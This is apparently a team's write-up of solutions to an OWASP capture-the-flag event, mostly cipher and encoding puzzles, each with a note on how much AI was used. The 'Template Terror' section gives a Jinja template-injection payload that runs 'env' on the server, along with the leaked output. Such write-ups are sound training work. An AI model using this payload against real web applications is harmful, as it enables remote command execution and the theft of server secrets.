# OWASP-SREC-Write-Up


# Code Maze

```
#!/usr/bin/env python3
# Obfuscated Python Challenge
# Can you figure out what this code does?

import base64, zlib

data = b"eJxVzLEKwjAQgOE9T3He1CzSkroUOojoquDQsdQ2rcE2CXdXtIjvLggKjv83/MpNMZAAL6xiw3wP1EEJzsdZEtx7sQRfLwC1cv2voSwB2bRkBAsFABDJeUlwF4hsKys4jM1QwLHank/P9NLPmzaXLPX1lN8M15nU15w6Qy/Uyo5s/yYVBT+sUH+MF17bh5Mk0+oNmck4FQ=="
exec(zlib.decompress(base64.b64decode(data)))

```
this is real 
```
print(zlib.decompress(base64.b64decode(data)))
```
this is used

Usage of AI: Zero
# Rev

chall should be reversed cuz talil have FLE which should be ELF.
so everything is reversed 
```
00402010  unsigned char const const encrypted_flag[0x18] = 
00402010  {
00402010      [0x00] =  0x15
00402011      [0x01] =  0x0d
00402012      [0x02] =  0x1b
00402013      [0x03] =  0x09
00402014      [0x04] =  0x0a
00402015      [0x05] =  0x21
00402016      [0x06] =  0x3c
00402017      [0x07] =  0x28
00402018      [0x08] =  0x6a
00402019      [0x09] =  0x37
0040201a      [0x0a] =  0x05
0040201b      [0x0b] =  0x6d
0040201c      [0x0c] =  0x6e
0040201d      [0x0d] =  0x6b
0040201e      [0x0e] =  0x36
0040201f      [0x0f] =  0x05
00402020      [0x10] =  0x6d
00402021      [0x11] =  0x6a
00402022      [0x12] =  0x05
00402023      [0x13] =  0x32
00402024      [0x14] =  0x69
00402025      [0x15] =  0x6e
00402026      [0x16] =  0x3e
00402027      [0x17] =  0x27
00402028  }

```

this give **OWASP{fr0m_741l_70_h34d}**

Usage of AI: AI is used to fix the Binary file.

# Caesar's Secret

```
BJNFC{p43f4e_p1cu3e_1f_34fl_g0_pe4px}

use shift:13
```

Usage of AI: Zero

# Ending Choas

```

Encoded data:
Vm10U1IyRXhSbk5XV0doU1lXMVNZVmxYZUV0T2JGSlpZMFp3VGxKdFp6SlZiVFYzVjFVeGNWVnFUbUZTVm1zd1dsY3hTMlJHVW5WaVIzaFlVbFZzTTFaR1dsTlJNbEpZVjJ4S1VWWkVRVGs9

use base64 4 times

VmtSR2ExRnNWWGhSYW1SYVlXeEtObFJZY0ZwTlJtZzJVbTV3V1UxcVVqTmFSVmswWlcxS2RGUnViR3hYUlVsM1ZGWlNRMlJYV2xKUVZEQTk
VkRGa1FsVXhRamRaYWxKNlRYcFpNRmg2Um5wWU1qUjNaRVk0ZW1KdFRubGxXRUl3VFZSQ2RXWlJQVDA9
VDFkQlUxQjdZalJ6TXpZMFh6RnpYMjR3ZEY4emJtTnllWEIwTVRCdWZRPT0=⏎             
T1dBU1B7YjRzMzY0XzFzX24wdF8zbmNyeXB0MTBufQ==⏎                             
OWASP{b4s364_1s_n0t_3ncrypt10n}
```

Usage of AI: Zero
# weak Lock

```
Key length: 4 bytes

Encrypted flag (hex): 0e160012113a3672752a1e2a72381e2c752a72321e727532381e3671332a3c

Pass is : AAAA
```

Usage of AI: how to do that
# RSA warmUp:

n = 3233
e = 17
d = 2753
(a ** b) % c

use (cipher ** d)%n

Usage of AI: used to find the Flag. But One of the teammate who submitted the flag fully spent time to understand how the mathmatical calcution works

# Xor Riddle:

```
Key length: 6 bytes
Algorithm: XOR

Encrypted (hex): 3c322221350f0b55112d54072c161a1f0847071752113a1742150b411709


pass: secret
```

Usage of AI: used to bruteforce the word
# Hidden in Plain Site:

use cat cmd to solve this

Usage of AI: Zero
# Secreet pixel:

Use StegnoGraphy tool to find the Flag

Usage of AI: Zero
# Digital Footprint:

Image Unique ID                 : 4f574153507b6d33743464347434

Owner Name                      : _ t3ll3s_4ll

Serial Number                   : 5f733363723374357d

Usage of AI: Zero
# Hidden in Plain Text:

file have multiple space and tabs.
space and tabs are consideren zero and one to find the text
it is 8 byte binary to text conversion

Usage of AI: used to find that there is different witespace charcter like space and tab. later VScode is used to find the flag manualy

# Template Terror

website is vulnerable to template injection and server has Jinja template.

payload used:
```
{{ lipsum._globals_['os'].popen('env').read() }}
```


Output:
```
# Hello, MAIL=/var/mail/chaluser USER=chaluser HOSTNAME=app HOME=/home/chaluser GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305 PYTHON_SHA256=c2c4321961fab0fb999d66e0cecf521c2ab3994c7992873ea99e306c1094fd5a WERKZEUG_SERVER_FD=3 LOGNAME=chaluser PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin LANG=C.UTF-8 SHELL=/bin/sh PYTHON_VERSION=3.12.15 PWD=/app FLAG=OWASP{sst1_4ll0ws_rc3_1f_n0t_s4n1t1z3d_3495b4d154} !999d66e0cecf521c2ab3994c7992873ea99e306c1094fd5a WERKZEUG_SERVER_FD=3 LOGNAME=chaluser PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin LANG=C.UTF-8 SHELL=/bin/sh PYTHON_VERSION=3.12.15 PWD=/app FLAG=OWASP{sst1_4ll0ws_rc3_1f_n0t_s4n1t1z3d_3495b4d154} !
```

Usage of AI: AI is used to craft the particular payload.
# Cipher Master

```
Encoding layers detected:
 Base64
 ROT13
 Base64
 Reverse

Encoded data:
=0TPENXbXNjW1UUUvNXc692aERlW3VjMaNXQR9maTFVcrh0SvdzTxg0TxFzR

Decoded data:
OWASP{mu1t1pl3_3nc0d1ng_l4y3rs}
```

this is simple, decode everything down to up. 
Use:
- reverse
- base64 decode
- ROT13 decode
- base64 decode

Usage of AI: Zero

# 67

it contains the sequence 6 and 7 in the whole text
take,
6 -> 0
7 -> 1
to solve the given text to binary
convert binary into text.

Solution:
```
OWASP{c0mpu73r5_d0n7_5p34k_b1n4ry_7h3y_5p34k_67}
```

Usage of AI: AI gave the idea to consider 6 and 7 as binary numbers
# what?!

libary : libheif
hash of the commit: 85e21ad44eba931314337300a2376b8d28f085ae
platforn: discourse

combine them to get the flag

OWASP{libheif_85e21ad44eba931314337300a2376b8d28f085ae_discourse}

Usage of AI: Zero (Google overview gave the hash and library in summary)



